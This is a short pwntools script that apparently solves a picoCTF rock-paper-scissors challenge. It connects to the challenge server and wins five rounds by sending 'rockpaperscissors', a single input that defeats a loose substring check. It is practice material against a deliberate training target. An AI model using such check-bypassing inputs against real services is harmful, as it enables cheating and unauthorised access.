from pwn import *
p = remote('saturn.picoctf.net', 52524)

for i in range(0, 5):
	p.recvuntil("program")
	p.sendline("1")
	p.recvuntil("):") 
	p.sendline("rockpaperscissors")

p.interactive()


